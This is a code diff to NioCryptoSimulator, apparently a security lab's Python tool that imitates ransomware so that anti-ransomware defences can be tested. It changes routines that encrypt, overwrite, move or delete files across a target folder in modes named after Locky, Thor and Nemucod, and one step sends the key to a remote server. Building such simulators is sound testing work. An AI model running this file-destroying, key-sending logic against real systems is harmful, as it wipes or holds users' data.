@@ -1,6 +1,6 @@
 
 # NioCryptoSimulator
-# by NioGuard Security Lab, ©2017
+# by NioGuard Security Lab, (c)2017
 # Author: Alexander Adamov
 # Email: ada@nioguard.com
 # Version 1.0
@@ -208,16 +208,15 @@ def encrypt_to_new_file(filepath):
         file_out.close()
         os.remove(filepath)
 
-def encrypt_cryptoapi(filepath):
+def encrypt_cryptoapi(folderpath):
     #global bError
-    print "Encrypting %s ..." % filepath
-    outputfile = filepath + ENC_EXT;
-    cmd_status = os.system("CryptoAPISim.exe -e %s %s" % (filepath, outputfile))
+    print "Encrypting %s ..." % folderpath
+    cmd_status = os.system("CryptoAPISim.exe -e %s %s" % (folderpath, ENC_EXT))
     if cmd_status != 0:
         print "ERROR: Error executing CryptoAPISim.exe"
         #bError = True
-    else:
-        os.remove(filepath)
+    #else:
+    #    os.remove(filepath)
     return cmd_status
 
 def xor_encrypt_file(in_file, out_file, key, encrypt_block_length):
@@ -321,41 +320,44 @@ def run_test_payload(test_type):
 
     
     print "Start testing ..."
+    
     # process test files
-    for root, dirs, files in os.walk(ENCRYPT_LOCATION):
-        for file in files:
-            if bError == False:
-                for ext in EXTENSIONS:
-                    if file.endswith(ext):
-                        fullpath = os.path.join(root, file)
-                        if test_type in ['ENCRYPT_TO_NEW_FILE', 'ENCRYPT_SAFE_DELETE', 'ENCRYPT_HTTP']:         
-                            encrypt_to_new_file(fullpath)
-                        if  test_type == 'ENCRYPT_AND_REPLACE':
-                            encrypt_and_replace(fullpath)
-                        if  test_type == 'ARCHIVE':    
-                            archive_gzip(fullpath)
-                        if  test_type == 'REMOVE':              
-                            print "Removing %s..." % fullpath
-                            os.remove(fullpath)
-                        if  test_type == 'REPLACE':
-                            replace(fullpath)
-                        if  test_type == 'ENCRYPT_TO_STREAM':  
-                            encrypt_to_stream(fullpath, stream_file_out)
-                        if test_type == 'MOVE':
-                            print "Moving %s..." % fullpath
-                            shutil.move(fullpath, move_folder_path)
-                        if test_type == 'ENCRYPT_XOR':
-                            encrypt_xor(fullpath, XOR_KEY_LENGTH)
-                        if test_type == 'NEMUCOD':
-                            encrypt_xor(fullpath, XOR_KEY_LENGTH, 2048)
-                        if test_type == 'ENCRYPT_CRYPTOAPI':
-                            cmd_status = encrypt_cryptoapi(fullpath)
-                        if test_type in ['LOCKY', 'THOR']:
-                            cmd_status = encrypt_cryptoapi(fullpath)
-                        if test_type == 'ENCRYPT_OPENSSL':
-                            encrypt_openssl(fullpath)
+    if test_type not in ['ENCRYPT_CRYPTOAPI', 'LOCKY', 'THOR', 'VAULTCRYPT']:
+        for root, dirs, files in os.walk(ENCRYPT_LOCATION):
+            for file in files:
+                if bError == False:
+                    for ext in EXTENSIONS:
+                        if file.endswith(ext):
+                            fullpath = os.path.join(root, file)
+                            if test_type in ['ENCRYPT_TO_NEW_FILE', 'ENCRYPT_SAFE_DELETE', 'ENCRYPT_HTTP']:         
+                                encrypt_to_new_file(fullpath)
+                            if  test_type == 'ENCRYPT_AND_REPLACE':
+                                encrypt_and_replace(fullpath)
+                            if  test_type == 'ARCHIVE':    
+                                archive_gzip(fullpath)
+                            if  test_type == 'REMOVE':              
+                                print "Removing %s..." % fullpath
+                                os.remove(fullpath)
+                            if  test_type == 'REPLACE':
+                                replace(fullpath)
+                            if  test_type == 'ENCRYPT_TO_STREAM':  
+                                encrypt_to_stream(fullpath, stream_file_out)
+                            if test_type == 'MOVE':
+                                print "Moving %s..." % fullpath
+                                shutil.move(fullpath, move_folder_path)
+                            if test_type == 'ENCRYPT_XOR':
+                                encrypt_xor(fullpath, XOR_KEY_LENGTH)
+                            if test_type == 'NEMUCOD':
+                                encrypt_xor(fullpath, XOR_KEY_LENGTH, 2048)
+                            if test_type == 'ENCRYPT_OPENSSL':
+                                encrypt_openssl(fullpath)
                         
     # post-processing    
+    if test_type == 'ENCRYPT_CRYPTOAPI':
+        cmd_status = encrypt_cryptoapi(ENCRYPT_LOCATION)
+    if test_type in ['LOCKY', 'THOR']:
+        cmd_status = encrypt_cryptoapi(ENCRYPT_LOCATION)
+
     if test_type in ['ENCRYPT_HTTP', 'LOCKY', 'THOR']:
         print "Sending the key to a remote server ..."
         http_status = http_post()
